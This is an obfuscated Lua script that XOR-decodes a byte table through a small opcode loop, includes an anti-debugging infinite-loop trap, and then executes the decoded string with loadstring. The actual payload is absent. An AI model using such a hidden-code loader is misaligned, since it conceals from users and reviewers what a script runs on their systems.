local ObZz = 70
local WpPKPg = {}
local TAwO = 1
local qWbas = true


    local function UymIK(a, b)
        local p, q = a, b
        local z = 0
        local w = 1
        while p > 0 or q > 0 do
            local ra = p % 2
            local rb = q % 2
            if ra ~= rb then z = z + w end
            p = math.floor(p / 2)
            q = math.floor(q / 2)
            w = w * 2
        end
        return z
    end
    

while qWbas do
    local ZFKTR = GuzHTEEC[TAwO]
    local vXB = ZFKTR
    local Aon = GuzHTEEC[TAwO + 1]
    
    if vXB == 14 then
            ObZz = 70
        elseif vXB == 11 then
            
        elseif vXB == 7 then
            local _ = math.floor(Aon / 2)
        elseif vXB == 13 then
            local nCO = 0
                if bit32 then
                    nCO = bit32.bxor(Aon, ObZz)
                elseif bit then
                    nCO = bit.bxor(Aon, ObZz)
                else
                    nCO = UymIK(Aon, ObZz)
                end
                table.insert(WpPKPg, string.char(nCO))
        elseif vXB == 1 then
            local _ = Aon % 3
        elseif vXB == 12 then
            local _ = debug and 1 or (function() while true do end end)()
        elseif vXB == 10 then
            ObZz = (ObZz + Aon) % 255
        elseif vXB == 6 then
            local _ = Aon * 2
        elseif vXB == 0 then
            qWbas = nil
        else
    end
    
    TAwO = TAwO + 2
end

local KRIop = table.concat(WpPKPg)
local szMIs = loadstring(KRIop) or load(KRIop)
szMIs()
